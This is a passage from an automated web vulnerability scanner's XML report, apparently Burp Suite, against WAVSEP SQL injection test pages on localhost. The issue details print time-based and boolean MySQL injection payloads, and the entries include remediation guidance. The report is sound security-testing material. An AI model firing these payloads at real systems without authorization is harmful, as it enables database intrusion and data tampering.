      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2857364795267573760</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWMtQ29tbWFuZEluamVjdGlvbi1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9tc2dpZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOSAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6024172013493467136</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/b3JkZXJieT0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2487591722245285888</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>' and '9524'='9524</b> and <b>' and '6024'='6033</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnJTIwYW5kJTIwJzk1MjQnJTNkJzk1MjQgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnJTIwYW5kJTIwJzYwMjQnJTNkJzYwMzMgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
